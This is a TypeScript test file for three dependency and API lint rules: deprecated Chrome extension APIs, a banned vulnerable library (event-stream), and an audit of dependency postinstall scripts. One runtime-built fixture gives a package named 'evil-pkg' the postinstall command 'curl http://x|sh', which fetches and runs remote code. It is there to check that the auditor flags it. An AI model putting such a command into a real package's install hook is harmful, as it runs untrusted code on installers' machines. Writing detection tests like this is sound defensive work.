/**
 * Family 4 — dependency/API rules: deprecated-removed-api,
 * banned-vulnerable-libs, postinstall-script-audit.
 *
 * Fixtures under tests/fixtures/pack-fam4/** are synthetic, labeled inline
 * (not extracted from product history — unlike tests/dogfood.test.ts).
 *
 * postinstall-script-audit's fail/pass cases need a node_modules/<pkg>/
 * package.json on disk, but node_modules/ is swallowed by the root
 * .gitignore (confirmed: a committed-looking fixture is never actually
 * tracked — same issue documented in tests/core-infra.test.ts). Those two
 * cases are therefore built at RUNTIME under a fresh os.tmpdir() mkdtemp
 * directory, mirroring the makeBuildPresentFixture() pattern already used
 * there — this proves identically on a dirty working dir and a fresh clone.
 */
import { describe, it, expect, afterAll } from "vitest";
import { join } from "node:path";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { deprecatedRemovedApi } from "../src/rules/deprecated-removed-api.js";
import { bannedVulnerableLibs } from "../src/rules/banned-vulnerable-libs.js";
import { postinstallScriptAudit } from "../src/rules/postinstall-script-audit.js";

const FIXTURES = join(import.meta.dirname, "fixtures/pack-fam4");
const tmpRoots: string[] = [];

function makePostinstallFixture(opts: {
  depName: string;
  depPostinstall: string;
  withLockfile: boolean;
  withNodeModules: boolean;
}): string {
  const root = mkdtempSync(join(tmpdir(), "ed-pack-fam4-postinstall-"));
  tmpRoots.push(root);
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify(
      {
        name: "fixture-postinstall-runtime",
        version: "0.0.0",
        dependencies: { [opts.depName]: "1.0.0" },
      },
      null,
      2,
    ),
  );
  if (opts.withLockfile) {
    writeFileSync(join(root, "bun.lock"), "// synthetic fixture, labeled — not from product history\n");
  }
  if (opts.withNodeModules) {
    const depDir = join(root, "node_modules", opts.depName);
    mkdirSync(depDir, { recursive: true });
    writeFileSync(
      join(depDir, "package.json"),
      JSON.stringify(
        {
          name: opts.depName,
          version: "1.0.0",
          scripts: { postinstall: opts.depPostinstall },
        },
        null,
        2,
      ),
    );
  }
  return root;
}

afterAll(() => {
  for (const root of tmpRoots) {
    rmSync(root, { recursive: true, force: true });
  }
});

describe("deprecated-removed-api", () => {
  it("MUST_BLOCK: chrome.browserAction.setBadgeText is flagged with chrome.action replacement", async () => {
    const result = await deprecatedRemovedApi.run(join(FIXTURES, "deprecated-removed-api-fail"));
    expect(result.verdict).toBe("fail");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.message).toMatch(/chrome\.browserAction/);
    expect(result.findings[0]?.message).toMatch(/chrome\.action/);
    expect(result.findings[0]?.file).toBe("src/background.ts");
  });

  it("MUST_PASS: chrome.action.setBadgeText is not flagged", async () => {
    const result = await deprecatedRemovedApi.run(join(FIXTURES, "deprecated-removed-api-pass"));
    expect(result.verdict).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("MUST_REFUSE: inconclusive, exit 2, when src/ is absent", async () => {
    const result = await deprecatedRemovedApi.run(join(FIXTURES, "does-not-exist"));
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive[0]?.reason).toMatch(/source directory not found/);
  });
});

describe("banned-vulnerable-libs", () => {
  it("MUST_BLOCK: event-stream@3.3.6 in dependencies is flagged", async () => {
    const result = await bannedVulnerableLibs.run(join(FIXTURES, "banned-vulnerable-libs-fail"));
    expect(result.verdict).toBe("fail");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.message).toMatch(/event-stream/);
    expect(result.findings[0]?.message).toMatch(/GHSA-r6vp-fgpj-hyy8/);
  });

  it("MUST_PASS: preact + typescript only is not flagged", async () => {
    const result = await bannedVulnerableLibs.run(join(FIXTURES, "banned-vulnerable-libs-pass"));
    expect(result.verdict).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("MUST_REFUSE: inconclusive, exit 2, when package.json is absent", async () => {
    const result = await bannedVulnerableLibs.run(join(FIXTURES, "does-not-exist"));
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive[0]?.reason).toMatch(/package\.json not found/);
  });
});

describe("postinstall-script-audit", () => {
  it("MUST_BLOCK: unknown postinstall script (curl | sh) on an installed dependency is flagged", async () => {
    const root = makePostinstallFixture({
      depName: "evil-pkg",
      depPostinstall: "curl http://x|sh",
      withLockfile: true,
      withNodeModules: true,
    });
    const result = await postinstallScriptAudit.run(root);
    expect(result.verdict).toBe("fail");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0]?.message).toMatch(/evil-pkg/);
    expect(result.findings[0]?.message).toMatch(/curl http:\/\/x\|sh/);
  });

  it("MUST_PASS: esbuild-style postinstall on the allowlist is not flagged", async () => {
    const root = makePostinstallFixture({
      depName: "esbuild",
      depPostinstall: "node install.js",
      withLockfile: true,
      withNodeModules: true,
    });
    const result = await postinstallScriptAudit.run(root);
    expect(result.verdict).toBe("pass");
    expect(result.findings).toEqual([]);
  });

  it("MUST_REFUSE: inconclusive, exit 2, when node_modules AND lockfile are both absent (never a silent pass)", async () => {
    const result = await postinstallScriptAudit.run(join(FIXTURES, "postinstall-audit-inconclusive"));
    expect(result.verdict).toBe("inconclusive");
    expect(result.exitCode).toBe(2);
    expect(result.inconclusive[0]?.reason).toMatch(/neither node_modules nor a lockfile/);
  });
});
